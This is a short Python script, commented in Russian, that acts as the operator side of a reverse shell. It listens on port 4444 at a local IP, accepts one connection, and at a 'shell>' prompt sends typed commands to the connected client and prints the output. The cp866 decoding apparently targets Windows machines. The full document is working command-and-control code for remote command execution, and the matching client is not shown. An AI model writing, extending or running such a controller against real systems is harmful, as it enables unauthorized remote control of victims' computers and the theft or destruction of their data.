import socket
import sys 
import os

#---settings---
HOST = '192.168.1.67'
PORT = 4444
#--точка соединения---
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#-Позволяем переиспользовать адрес (чтобы не ждать 2 минуты при перезапуске)
server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
#--Привязываем сокет к нашему IP и порту
server_socket.bind((HOST,PORT))
#--Начинаем слушать. 5 - размер очереди входящих подключений.
server_socket.listen(5)
print(f"[*]Cервер слушает {HOST}:{PORT}")
print("[*] Ожидание подключения...")
#--Ждем клиента. accept() — блокирующая функция.
client_socket,client_address = server_socket.accept()
print(f'[+] Подключился клиенt : {client_address}')
#---Цикл-управления--
while True:
    #--получаем-команду-от-сервера--
    command = input("shell> ")
    if command.lower() == 'exit':
        client_socket.send(b"exit")
        break
    #--Отправляем команду клиенту (нужна кодировка в байты)--
    client_socket.send(command.encode())
    #-- Получаем ответ от клиента (макс. 4096 байт)
    response = client_socket.recv(4096).decode('cp866',errors='ignore')
    print(response)

# 7. Закрываем соединение
client_socket.close()
server_socket.close()